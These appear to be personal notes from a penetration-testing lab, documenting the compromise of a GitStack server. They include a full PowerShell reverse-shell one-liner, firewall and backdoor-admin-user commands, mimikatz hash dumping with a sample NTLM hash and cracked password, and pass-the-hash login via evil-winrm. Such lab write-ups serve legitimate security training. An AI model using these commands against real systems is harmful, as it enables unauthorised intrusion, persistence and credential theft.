Scanning the git server after uploading a static nmap binary...

	Found 2 new hosts.

		- 10.200.90.100
			- Contains filtered ports
		- 10.200.90.150
			- 135
			- 3389	To be checked
			- 445
			- 139
			- 80	To be checked 
			- 5985	To be checked

5985
	- This is running an http server

- Pivoting through port forwarding using sshuttle
	- The machine didn't respond to ping requests.


- Got into the network... Accessed the website; found 3 paths on http://10.200.90.150:80

/gitstack directory giving access to a login form... Found an exploit... Not sure, if it's for the current version number. (No version info retreieved)

- Using exploit 43777 (rce).
	- Exploit needed some changes... and code execution was successful.


Note: Directory listing is available for the content that should not be visible to an unauthorized user
	- Path found: /gitstack/DIRECTORIES/asdf

- Trying to get reverse shell using the exploit.

Uploading socat from the previously rooted prod-serv... and then enumerating there.

- Ohhh, right... We can't invoke request... Because firewall is up... 
	- To allow the firewall outbound traffic on a specific port:

		firewall-cmd --zone=public --add-port PORT/tcp

- Powershell reverse-shell (replace 'IP',PORT)
	
	powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


Stablization and Post Exploitation
------------------------------------

- We already got the nt authority\system user so we can create a dummy user for our operations...

	net user j4x0n test123 /add
	net localgroup Administrators j4x0n /add
	net localgroup "Remote Manangement Users" j4x0n /add

- The above commands will give us admin level shell access as well as rdp access to that user.

- For the shell access in cmd, we can use evil-winrm
	sudo gem install evil-winrm

	evil-winrm -u j4x0n -p test123 -i <IP> -P <port>

- For RDP access we can use a tool: xfreerdp (it gives vast number of options; from routing audio and usb connections to pass-the-hash attacks over rdp)
	- Following are a few useful switches/flags you can use in this tool:

		- /v - To specify IP/hostname
		- /u - To speciy username
		- /p - To specify password
		- /dynamic-resolution - allows us to resize the window.
		- /size:WidthxHeight - sets specific height and width that don't resize automatically with /dynamic-resolution
		- +clipboard - enables clipboard support
		- /drive:LOCAL_DIRECTORY,SHARE_NAME - Allows to share files across the attacker machine and the machine with RDP access.
			- Because of this switch... We don't need to store files on the host machine... We can easily use our toolset by directly mounting our directory to it.
			- We can access the shared drive with GUI access or with CUI \\tsclient\<nameoftheshare>

- Ran mimikatz the on the machine...
	- dumped password hashes

		Administrator:37db630168e5f82aafa8461e05c6bbd1

- After cracking Thomas's hash

	Thomas:i<3ruby

Note: We can login via cui with evil-winrm authenticating using a hash... with -H flag.
	
	evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i <IP> 

Extra Notes
-------------

How is that a static binary?


I am on this git server for about 2 hours...
